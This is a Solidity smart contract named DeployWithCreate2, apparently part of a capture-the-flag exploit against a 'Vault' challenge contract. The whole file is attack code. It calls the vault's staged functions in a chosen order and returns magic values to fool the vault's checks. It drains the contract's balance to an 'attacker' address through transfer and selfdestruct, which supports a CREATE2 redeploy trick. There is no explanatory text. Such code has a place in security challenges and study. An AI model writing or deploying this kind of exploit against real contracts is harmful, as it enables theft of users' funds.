// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "./Vault.sol";
import "./Exploit.sol";

contract DeployWithCreate2 {
    bool private switcher = false;
    Vault private vault;
    address payable private attacker;

    enum State {
        THREE,
        TWO,
        ONE,
        ZERO
    }

    constructor(address _vault, address _attacker) {
        vault = Vault(_vault);
        attacker = payable(_attacker);
        bool switcherValue = Exploit(msg.sender).switcherValue();
        if (!switcherValue) {
            vault.third();
        } else {
            switcher = true;
            vault.first();
        }
    }

    function sup() external returns (uint256) {
        if (switcher) {
            return 80085;
        } else {
            return 1337;
        }
    }

    function call2nd() public {
        vault.second();
    }

    function callFourth() public {
        vault.fourth();
    }

    function changeSwitcher(bool value) public {
        switcher = value;
    }

    function destroy() public {
        selfdestruct(attacker);
    }

    fallback() external payable {}

    function transferFunds() external {
        attacker.transfer(address(this).balance);
    }
}
